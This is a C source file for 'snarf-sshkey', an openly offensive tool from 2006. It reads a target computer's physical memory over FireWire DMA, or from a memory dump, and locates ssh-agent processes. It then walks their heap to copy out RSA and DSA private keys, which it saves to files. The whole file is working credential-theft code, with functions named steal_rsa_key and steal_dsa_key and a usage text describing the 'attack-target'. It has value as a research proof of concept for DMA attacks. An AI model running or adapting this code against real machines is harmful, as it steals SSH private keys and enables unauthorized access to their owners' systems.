/*  $Id$
 *  vim: fdm=marker
 *
 *  snarf-sshkey : snarf ssh private keys from ssh-agent via
 *                 physical memory access (e.g. firewire)
 *
 *  Copyright (C) 2006
 *  losTrace aka "David R. Piegdon"
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License version 2, as
 *  published by the Free Software Foundation.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 */

// TODO:
// 	1. resolve "idtable" from .bss
// 	2. resolve all keys in idtable
// 		see also TAILQ stuff (defined in openssh/openbsd-compat/sys-queue.h)
// 	3. dump all keys

#define _LARGEFILE64_SOURCE

// needed for memmem:
#define _GNU_SOURCE

#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>
#include <string.h>
#include <time.h>
#include <getopt.h>

#include <openssl/rsa.h>
#include <openssl/dsa.h>
#include <openssl/evp.h>
#include <openssl/bn.h>

#include <libraw1394/raw1394.h>
#include <libraw1394/csr.h>

#include <physical.h>
#include <linear.h>
#include <endian_swap.h>

#include "proc_info.h"
#include "ssh-authfile.h"
#include "sshkey-sanitychecks.h"
#include "term.h"

char pagedir[4096];

// if test_keys = 1, we will test the captured keys on the fly.
// this may take several seconds, depending on keytype and length!
int test_keys = 0;

// uid - unique ID for the memory source (filename of memdump or
// ieee1394-GUID of host)
char* uid = NULL;

#define NODE_OFFSET     0xffc0

// fix a remote bignum to a local bignum:
// copy all important internal data of struct bignum_st.
// returns malloc()d bignum.
BIGNUM* fix_bignum(linear_handle lin, BIGNUM* rb)
{{{
	addr_t p;
	BIGNUM* b;
#ifdef __BIG_ENDIAN__
	int i;
#endif

	printf("\t\t\t\tfix bignum @0x%08x: ", (uint32_t)rb);
	p = (uint32_t)rb;
	p &= 0xffffffff;

	if(!p) {
		printf("possibly ok...\n");
		return NULL;
	}

	b = calloc(1, sizeof(BIGNUM));

	if(   linear_read(lin, p   , &(b->d), 4)
	   || linear_read(lin, p+4 , &(b->top), 4)
//	   || linear_read(lin, p+8 , &(b->dmax), 4)
	   || linear_read(lin, p+12, &(b->neg), 4)
//	   || linear_read(lin, p+16, &(b->flags), 4)
	   ) {
		free(b);
		printf("failed to read BIGNUM @0x%08llx\n", p);
		return NULL;
	}

#ifdef __BIG_ENDIAN__
	b->d = (BN_ULONG*) endian_swap32((uint32_t)b->d);
	b->top = endian_swap32(b->top);
//	b->dmax = endian_swap32(b->dmax);
	b->neg = endian_swap32(b->neg);
//	b->flags = endian_swap32(b->flags);
#endif

	// set flags to BN_FLG_MALLOCED, because we used malloced memory for
	// all our bignums.
	b->flags = BN_FLG_MALLOCED;

	// don't use dmax but top, as this is the number of really
	// used words. all words above top are leading zeroes.
	b->dmax = b->top;

	// load b->d
	p = ((uint32_t)b->d);
	p &= 0xffffffff;
	b->d = calloc(4, b->dmax);
	// actually, elements of d[] can be of 16, 32 or 64 bits, depending on how
	// "BITS2" was defined in openssl/bn.h
	// so, this will only work, if on the target system, it was defined as 32.
	if(linear_read(lin, p, b->d, 4*b->dmax)) {
		free(b->d);
		free(b);
		printf("failed to read BIGNUM data block @0x%08llx\n", p);
		return NULL;
	}
#ifdef __BIG_ENDIAN__
	for(i=0; i<b->dmax; i++) {
		b->d[i] = endian_swap32(b->d[i]);
	}
#endif

	printf("recovered to 0x%08x\n", (uint32_t)b);
	return b;
}}}

// copy all important internal data of a remote struct rsa_st.
int steal_rsa_key(linear_handle lin, Key* key)
{{{
	addr_t p;

	if(!key->rsa)
		return 0;

	p = (uint32_t)key->rsa;
	p &= 0xffffffff;

	key->rsa = calloc(1, sizeof(RSA));

	if(   linear_read(lin, p   , &(key->rsa->pad), 4)
	   || linear_read(lin, p+4 , &(key->rsa->version), 4)
	   //                   +8  : *meth : who cares
	   //                   +12 : *engine: who cares
	   || linear_read(lin, p+16 , &(key->rsa->n), 4)
	   || linear_read(lin, p+20 , &(key->rsa->e), 4)
	   || linear_read(lin, p+24 , &(key->rsa->d), 4)
	   || linear_read(lin, p+28 , &(key->rsa->p), 4)
	   || linear_read(lin, p+32 , &(key->rsa->q), 4)
	   || linear_read(lin, p+36 , &(key->rsa->dmp1), 4)
	   || linear_read(lin, p+40 , &(key->rsa->dmq1), 4)
	   || linear_read(lin, p+44 , &(key->rsa->iqmp), 4)
	   || linear_read(lin, p+56 , &(key->rsa->flags), 4)) {
		free(key->rsa);
		key->rsa = NULL;
		return 0;
	}
	// don't care for anything else.
	
#ifdef __BIG_ENDIAN__
	key->rsa->pad = endian_swap32(key->rsa->pad);
	key->rsa->version = endian_swap32(key->rsa->version);

	key->rsa->n = (BIGNUM*)endian_swap32((uint32_t) key->rsa->n);
	key->rsa->e = (BIGNUM*)endian_swap32((uint32_t) key->rsa->e);
	key->rsa->d = (BIGNUM*)endian_swap32((uint32_t) key->rsa->d);
	key->rsa->p = (BIGNUM*)endian_swap32((uint32_t) key->rsa->p);
	key->rsa->q = (BIGNUM*)endian_swap32((uint32_t) key->rsa->q);
	key->rsa->dmp1 = (BIGNUM*)endian_swap32((uint32_t) key->rsa->dmp1);
	key->rsa->dmq1 = (BIGNUM*)endian_swap32((uint32_t) key->rsa->dmq1);
	key->rsa->iqmp = (BIGNUM*)endian_swap32((uint32_t) key->rsa->iqmp);

	key->rsa->flags = endian_swap32(key->rsa->flags);
#endif

	printf("\t\t\tRSA: pad:%d version:%ld flags:%d data: n@%p e@%p d@%p p@%p q@%p  dmp1@%p dmq1@%p iqmp@%p\n",
		key->rsa->pad, key->rsa->version, key->rsa->flags, key->rsa->n, key->rsa->e, key->rsa->d, key->rsa->p, key->rsa->q,   key->rsa->dmp1, key->rsa->dmq1, key->rsa->iqmp);

	key->rsa->n = fix_bignum(lin, key->rsa->n);
	key->rsa->e = fix_bignum(lin, key->rsa->e);
	key->rsa->d = fix_bignum(lin, key->rsa->d);
	key->rsa->p = fix_bignum(lin, key->rsa->p);
	key->rsa->q = fix_bignum(lin, key->rsa->q);
	
	key->rsa->dmp1 = fix_bignum(lin, key->rsa->dmp1);
	key->rsa->dmq1 = fix_bignum(lin, key->rsa->dmq1);
	key->rsa->iqmp = fix_bignum(lin, key->rsa->iqmp);

	// check if all bignums were recovered and do some sanitychecks
	if(key->rsa->n && key->rsa->e && key->rsa->d && key->rsa->p && key->rsa->q && key->rsa->dmp1 && key->rsa->dmq1 && key->rsa->iqmp) {
		if(test_keys) {
			test_rsa(key->rsa);
		}
		return 1;
	}

	// failed to recover RSA bignums...

	BN_free(key->rsa->n);
	BN_free(key->rsa->e);
	BN_free(key->rsa->d);
	BN_free(key->rsa->p);
	BN_free(key->rsa->q);
	BN_free(key->rsa->dmp1);
	BN_free(key->rsa->dmq1);
	BN_free(key->rsa->iqmp);

	free(key->rsa);
	key->rsa = NULL;
	printf("\t\t\t" TERM_RED "failed to recover bignums." TERM_RESET "\n");
	return 0;
}}}

// copy all important internal data of a remote struct dsa_st.
int steal_dsa_key(linear_handle lin, Key* key)
{{{
	addr_t p;

	if(!key->dsa)
		return 0;

	p = (uint32_t)key->dsa;
	p &= 0xffffffff;

	key->dsa = calloc(1,sizeof(DSA));

	if(   linear_read(lin, p   , &(key->dsa->pad), 4)
	   || linear_read(lin, p+4 , &(key->dsa->version), 4)
	   || linear_read(lin, p+8 , &(key->dsa->write_params), 4)
	   || linear_read(lin, p+12, &(key->dsa->p), 4)
	   || linear_read(lin, p+16, &(key->dsa->q), 4)
	   || linear_read(lin, p+20, &(key->dsa->g), 4)
	   || linear_read(lin, p+24, &(key->dsa->pub_key), 4)
	   || linear_read(lin, p+28, &(key->dsa->priv_key), 4)
	   || linear_read(lin, p+32, &(key->dsa->flags), 4) ) {
		free(key->dsa);
		key->dsa = NULL;
		return 0;
	}
	key->dsa->references = 0;
	// don't care for the rest
	//  p+36  method_mont_p (?)
	//  p+40  references (?)
	//  p+44  ex_data (?)
	//  p+48  meth (?)
	//  p+52  engine (?)

#ifdef __BIG_ENDIAN__
	key->dsa->pad = endian_swap32(key->dsa->pad);
	key->dsa->version = endian_swap32(key->dsa->version);
	key->dsa->write_params = endian_swap32(key->dsa->write_params);
	key->dsa->p = (BIGNUM*)endian_swap32((uint32_t) key->dsa->p);
	key->dsa->q = (BIGNUM*)endian_swap32((uint32_t) key->dsa->q);
	key->dsa->g = (BIGNUM*)endian_swap32((uint32_t) key->dsa->g);
	key->dsa->pub_key = (BIGNUM*)endian_swap32((uint32_t) key->dsa->pub_key);
	key->dsa->priv_key = (BIGNUM*)endian_swap32((uint32_t) key->dsa->priv_key);
	key->dsa->flags = endian_swap32(key->dsa->flags);
#endif

	printf("\t\t\tDSA: pad %d, version %d, write_params %d, p@0x%08x, q@0x%08x, g@0x%08x, pub_key@0x%08x, priv_key@0x%08x\n",
		key->dsa->pad, (uint32_t)key->dsa->version, key->dsa->write_params, (uint32_t)key->dsa->p,
		(uint32_t)key->dsa->q, (uint32_t)key->dsa->g, (uint32_t)key->dsa->pub_key, (uint32_t)key->dsa->priv_key);

	key->dsa->p = fix_bignum(lin, key->dsa->p);
	key->dsa->q = fix_bignum(lin, key->dsa->q);
	key->dsa->g = fix_bignum(lin, key->dsa->g);
	key->dsa->pub_key = fix_bignum(lin, key->dsa->pub_key);
	key->dsa->priv_key = fix_bignum(lin, key->dsa->priv_key);

	// check if all bignums were recovered and do some sanitychecks
	if(key->dsa->p && key->dsa->q && key->dsa->g && key->dsa->pub_key && key->dsa->priv_key) {
		if(test_keys) {
			test_dsa(key->dsa);
		}
		return 1;
	}

	// failed to recover DSA bignums...

	BN_free(key->dsa->p);
	BN_free(key->dsa->q);
	BN_free(key->dsa->g);
	BN_free(key->dsa->pub_key);
	BN_free(key->dsa->priv_key);

	free(key->dsa);
	key->dsa = NULL;
	printf("\t\t\t" TERM_RED "failed to recover bignums." TERM_RESET "\n");
	return 0;
}}}

// create a unique filename, consisting of UUID, ssh-agent's
// username and key's comment and save the key to this file.
void save_key(char *key_comment, Key* key, char *username)
{{{
	char* comment;
	char* p;

	char* comment_field;		// finally used for comment-field in dumped key
	char* filename;			// file to dump key to
	char* id;
	char* bid;

	id = strdupa(uid);
	bid = basename(id);

	// create a comment that does not contain slashes
	comment = malloc(strlen(key_comment) + 1);
	p = comment;
	while(*key_comment) {
		if(*key_comment == '/')
			*p = '%';
		else
			*p = *key_comment;
		key_comment++;
		p++;
	}
	*p = 0;
	
	comment_field = malloc( 7 + strlen(username) + strlen(bid) );
	sprintf(comment_field, "%s@host_%s", username, bid);
	filename = malloc(7 + strlen(bid) + strlen(username) + strlen(comment_field));
	sprintf(filename, "key %s %s %s", bid, username, comment);

	// dump the key
	printf("\t\t" TERM_CYAN "dumping key \"%s\" to file \"%s\"" TERM_RESET "\n", comment_field, filename);
	key_save_private(key, filename, "", comment_field);

	free(comment_field);
	free(filename);
	free(comment);
}}}




// attack an ssh-agent's address space:
// 	search '$HOME/.ssh/' in the heap
// 	search string's address in heap (is part of struct identity)
//	if found:
//		print identity.death (time of death of this key)
//		steal identity.key
void check_ssh_agent(linear_handle lin, char **envv)
{{{
#	define AGENT_START	0x08000
#	define AGENT_MAXLEN	0x00800
#	define REMOTE_TO_LOCAL(r,lbase)	((char*) (lbase + ((uint32_t)r) - (AGENT_START << 12)) )
#	define LOCAL_TO_REMOTE(l,lbase)	((char*) (l - lbase + (AGENT_START << 12)) )

	char identity_path[1024];
	char *heap;	// actually this is a dump of the executable and heap
			// but we don't care for the executable.
	char *home;
	addr_t pn;

	char *comment;	// location of the comment field
	char *rcomment; // remote location of the comment field
	char *identity; // location of struct identity (actually pointing somewhere into it)
	addr_t ridentity;
	addr_t rkey;	// remote location of the key
	time_t t;	// local time
	time_t death;	// when the key dies
	Key key;	// the key we want
	int n;

	printf( TERM(TERM_A_BLINK,TERM_C_BG_RED) "hit:" TERM_RESET " ");

	// get string we search for
	home = resolve_env(envv, "HOME");
	if(!home) {
		printf("failed to lookup $HOME!> ");
		return;
	}

	snprintf(identity_path, 1024, "%s/.ssh/", home);
	printf("identity path would be \"%s\"> ", identity_path);
	// now lets seek for this string. it will be located somewhere
	// on the heap, right behind the executable.
	// the executable is mapped somewhere after 0x08000000, so
	// we will just start there. 0x08800000 should never be hit.
	// btw. we are searching this string because it will be the
	// comment-field of the identity-struct of the ssh-agent.
	// for more info, please see ssh-agent.c of openssh
	heap = calloc(AGENT_MAXLEN, 4096);
	for(pn = 0; pn < AGENT_MAXLEN; pn++) {
		linear_read_page(lin, AGENT_START + pn, heap + 4096 * pn);
	}

	// find all substrings in the heap (one for each loaded keypair that resides in $HOME/.ssh/)
	comment = heap;
	while((comment = memmem(comment + 1, AGENT_MAXLEN * 4096 - (comment+1 - heap), identity_path, strlen(identity_path)))) {
						// do not search the tailing \0 !
		rcomment = LOCAL_TO_REMOTE(comment, heap);
		printf("\nfound the string \"" TERM(TERM_A_NORMAL,TERM_C_FG_RED) "%s" TERM_RESET "\" at remote 0x%08x\n", comment, (uint32_t)rcomment);
#ifdef __BIG_ENDIAN__
		rcomment = (char*) endian_swap32((uint32_t)rcomment);
#endif
		identity = memmem(heap, AGENT_MAXLEN * 4096, &rcomment, 4);
		if(!identity) {
			printf("\tdid not find matching identity struct\n");
			break;
		}
		//
		// identity-struct struct found
		//
		identity -= 4; // now it points to 'Key* key' inside the identity-struct
		ridentity = ((uint64_t)(uint32_t)LOCAL_TO_REMOTE(identity, heap)) & 0xffffffff;

		// print time of death of this key:
		t = time(NULL);
		if(linear_read(lin, ridentity+8, &death, 4))
			break;
#ifdef __BIG_ENDIAN__
		death = endian_swap32(death);
#endif
		if(death == 0)
			printf("\t\tkey lives infinite.\n");
		else
			if(death < t)
				printf("\t\tkey should be dead (timeout) for %d seconds.\n", (uint32_t)t - (uint32_t)death);
			else
				printf("\t\tkey will live for %u seconds\n", (uint32_t)death - (uint32_t)t);


		// locate the key struct
		// carefull: sizeof(rkey) is 8!
		if(linear_read(lin, ridentity, &n, 4))
			break;
		rkey = n;
#ifdef __BIG_ENDIAN__
		rkey = ((uint64_t)endian_swap32((uint32_t)rkey));
#endif
		rkey &= 0xffffffff;
		printf("\t\tkey is at remote 0x%08x.\n", (uint32_t)rkey);

		// load the key struct
		if( linear_read(lin, rkey,    &key.type, 4)  ||
		    linear_read(lin, rkey+4,  &key.flags, 4) ||
		    linear_read(lin, rkey+8,  &key.rsa, 4)   ||
		    linear_read(lin, rkey+12, &key.dsa, 4) )
			break;
#ifdef __BIG_ENDIAN__
		key.type = endian_swap32(key.type);
		key.flags = endian_swap32(key.flags);
		key.rsa = (RSA*)endian_swap32((uint32_t)key.rsa);
		key.dsa = (DSA*)endian_swap32((uint32_t)key.dsa);
#endif
		printf("\t\tKEY: type:%d flags:0x%x, RSA* 0x%08x, DSA* 0x%08x\n", key.type, key.flags, (uint32_t)key.rsa, (uint32_t)key.dsa);

	 	// check all keytypes and steal existing
		if(key.rsa) {
			printf("\t\t" TERM_BLUE "trying to steal RSA key at remote 0x%08x" TERM_RESET "\n", (uint32_t)key.rsa);
			if(!steal_rsa_key(lin, &key)) {
				printf("\t\tfailed :(\n");
				key.rsa = 0;
			}
		}
		if(key.dsa) {
			printf("\t\t" TERM_BLUE "trying to steal DSA key at remote 0x%08x" TERM_RESET "\n", (uint32_t)key.dsa);
			if(!steal_dsa_key(lin, &key)) {
				printf("\t\tfailed :(\n");
				key.dsa = 0;
			}
		}
		// save the key to a file
		if(key.rsa || key.dsa)
			save_key(comment, &key, resolve_env(envv, "USER"));

		// TODO: free key...
	}
	free(heap);
}}}




// show usage info
void usage(char* argv0)
{{{
	printf(	"%s ["TERM_BLUE"-t"TERM_RESET"] <"TERM_YELLOW"-n node-id"TERM_RESET" | "TERM_YELLOW"-f file"TERM_RESET">\n"
		"\n"
		"i will snarf ssh public/private keypairs from all ssh-agents i can\n"
		"find on\n"
		"   * the system hanging on your IEEE1394 bus with the given\n"
		"     "TERM_YELLOW"node-id"TERM_RESET". node-id should be an integer in [0..63]; you can\n"
		"     use ``1394csrtool -s'' or ``gscanbus'' or other bus-scanning tools to\n"
		"     identify the attack-target.\n"
		"   * the memory dump identified by "TERM_YELLOW"file"TERM_RESET"\n"
		"\n"
		TERM_RED"be aware"TERM_RESET", that i only operate on IA32 linux with no more than 4GB\n"
		"of RAM and that i only search for ``ssh-agent'' processes and keys\n"
		"loaded into them with the absolute path of ``$HOME/.ssh/''.\n"
		"\n"
		"if you specify ``"TERM_BLUE"-t"TERM_RESET"'' i will try to verify that the snarfed\n"
		"keypair is ok.\n"
		"\n"
		,
		argv0
		);
}}}

enum memsource {
	SOURCE_UNDEFINED,
	SOURCE_MEMDUMP,
	SOURCE_IEEE1394
};

// will scan the targets memory for pagedirs,
// for each found:
//                 if it is an ssh-agent, try to steal keys
int main(int argc, char**argv)
{{{
	physical_handle phy;
	union physical_type_data phy_data;
	linear_handle lin;
	addr_t pn;
	char page[4096];
	float prob;
	int c;
	char *p;

	enum memsource memsource = SOURCE_UNDEFINED;
	char *filename;
	int nodeid;

	uint64_t guid;
	uint32_t high;
	uint32_t low;

	// parse arguments
	while( -1 != (c = getopt(argc, argv, "tn:f:"))) {
		switch (c) {
			case 't':
				test_keys = 1;
				break;
			case 'n':
				memsource = SOURCE_IEEE1394;
				nodeid = strtoll(optarg, &p, 10);
				if((p&&(*p)) || (nodeid > 63) || (nodeid < 0)) {
					printf("invalid nodeid. nodeid should be >=0 and <64.\n");
					usage(argv[0]);
					return -2;
				}
				break;
			case 'f':
				memsource = SOURCE_MEMDUMP;
				filename = optarg;
				break;
			default:
				usage(argv[0]);
				return -2;
				break;
		}
	}
	if(c != -1) {
		printf("too many arguments? (\"%s\")\n", argv[c]);
		usage(argv[0]);
		return -2;
	}

	// prepare and associate physical handle
	phy = physical_new_handle();
	if(!phy)
		{ printf("physical handle is null! insufficient memory?!\n"); return -1; }
	if( memsource == SOURCE_IEEE1394 ) {
		// create raw1394handle
		phy_data.ieee1394.raw1394handle = raw1394_new_handle();
		if(!phy_data.ieee1394.raw1394handle)
			{ printf("failed to open raw1394\n"); return -3; }
		// associate raw1394 to port
		if(raw1394_set_port(phy_data.ieee1394.raw1394handle, 0))
			{ printf("raw1394 failed to set port\n"); return -3; }
		// set attack target
		phy_data.ieee1394.raw1394target = nodeid + NODE_OFFSET;
		printf("using target %d\n", phy_data.ieee1394.raw1394target - NODE_OFFSET);
		if(physical_handle_associate(phy, physical_ieee1394, &phy_data, 4096)) {
			printf("physical_handle_associate() failed\n");
			return -3;
		}
		// get GUID of target
		raw1394_read(lin->phy->data.ieee1394.raw1394handle, nodeid+NODE_OFFSET, CSR_REGISTER_BASE + CSR_CONFIG_ROM + 0x0c, 4, &low);
		raw1394_read(lin->phy->data.ieee1394.raw1394handle, nodeid+NODE_OFFSET, CSR_REGISTER_BASE + CSR_CONFIG_ROM + 0x10, 4, &high);
		// GUID is in big endian.
#ifndef __BIG_ENDIAN__  
		guid = (((uint64_t)high) << 32) | low;
		guid = endian_swap64(guid);
#else
		guid = (((uint64_t)low) << 32) | high;
#endif
		uid = malloc(9);
		snprintf(uid, 8, "%08llx", guid);
	} else if( memsource == SOURCE_MEMDUMP ) {
		c = open(filename, O_RDONLY);
		if(c < 0) {
			printf("failed to open file \"%s\"\n", filename);
			return -2;
		}
		phy_data.filedescriptor.fd = c;
		if(physical_handle_associate(phy, physical_filedescriptor, &phy_data, 4096)) {
			printf("physical_handle_associate() failed\n");
			return -3;
		}
		uid = filename;
	} else {
		printf("missing memory source\n");
		usage(argv[0]);
		return -2;
	}
	
	// prepare and associate linear handle
	lin = linear_new_handle();
	printf("assoc lin handle..\n"); fflush(stdout);
	if(linear_handle_associate(lin, phy, arch_ia32)) {
		printf("failed to associate lin ia32!\n");
		return -1;
	}

	printf(	"now checking first phys. 1GB for pagedirectories:\n"
		"keys:\t\t.    -   checked another 0x80 pages\n"
		    "\t\t_    -   matched simple expression but not NCD\n"
		    "\t\to    -   matched NCD but failed to load referenced pagetables\n"
		    "\t\tK    -   matched NCD, loaded but found no stack (kernel thread?)\n"
		    "\t\tE    -   loaded, found stack, but unable to parse stack\n"
		    "\t\tU<n> -   loaded, found stack, process name ``n''\n"
		    "\n");
	// search all pages for pagedirs
	// then, for each found, print process name
	// we only need to check first phys. GB
	for( pn = 0; pn < 0x40000; pn++ ) {
		fflush(stdout);
		if((pn%0x80) == 0)
			putchar('.');
		c = linear_is_pagedir_fast(lin, pn);
		if(c < 0) {
			printf("\n\n" TERM_RED "failed to read page 0x%05llx. aborting." TERM_RESET "\n", pn);
			break;
		}

		if(c) {
			// load page
			physical_read_page(phy, pn, page);
			prob = linear_is_pagedir_probability(lin, page);
			if(prob > 0.01) {
				char *bin;
				int    argc;
				char **argv;
				int    envc;
				char **envv;

				// set the pagedir
				//printf("page 0x%05llx prob: %0.3f", pn, prob);
				if(linear_set_new_pagedirectory(lin, page)) {
					putchar('o');
					continue;
				}

				// get process name
				if(1 == proc_info(lin, &argc, &argv, &envc, &envv, &bin)) {
					if(bin) {
						printf("U" TERM(TERM_A_NORMAL,TERM_C_FG_BLUE) "<%s>" TERM_RESET, bin);

						// check for ssh-agent
						if((!strcmp(bin, "ssh-agent") || !strcmp(bin, "/usr/bin/ssh-agent")))
							check_ssh_agent(lin, envv);
					} else {
						printf(TERM(TERM_A_NORMAL,TERM_C_FG_RED) "K" TERM_RESET);
					}

					free(envv);
					free(argv);
				} else {
					putchar('E');
				}
			} else {
				putchar('_');
			}
		}
	}
	printf("\n\n");

	// release handles
	linear_handle_release(lin);

	if( memsource == SOURCE_IEEE1394 ) {
		raw1394_destroy_handle(phy_data.ieee1394.raw1394handle);
	} else if( memsource == SOURCE_MEMDUMP ) {
		close(phy_data.filedescriptor.fd);
	}

	physical_handle_release(phy);
	
	return 0;
}}}

